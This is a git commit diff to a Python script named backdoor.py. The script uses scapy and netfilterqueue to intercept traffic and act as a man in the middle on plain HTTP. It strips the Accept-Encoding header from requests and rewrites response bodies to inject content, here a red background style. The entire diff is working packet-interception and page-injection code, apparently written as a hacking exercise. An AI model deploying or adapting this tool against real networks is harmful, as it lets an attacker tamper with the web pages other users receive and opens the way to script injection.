f465c4cfbdae4414205e2ac2efcc6e92c2269cf8
mtai83 <benguyen08032003@gmail.com>
2024-06-29 13:41:53 -0400

    Fix bug stop process

--- backdoor.py
+++ backdoor.py
@@ -11,7 +11,8 @@ def set_load(packet, load):
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
+    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
+    
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
             modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
@@ -19,10 +20,12 @@ def process_packet(packet):
             packet.set_payload(bytes(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            modified_load = scapy_packet[scapy.Raw].load.replace(b"<body>",  b"<body style='background-color:red;'>")
+            modified_load = scapy_packet[scapy.Raw].load.replace(b'<body',  b'<body style="background-color:red;"')
             new_packet = set_load(scapy_packet, modified_load)
             packet.set_payload(bytes(new_packet))
             print("SUCCESS MODIFIED")
+    
+            
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
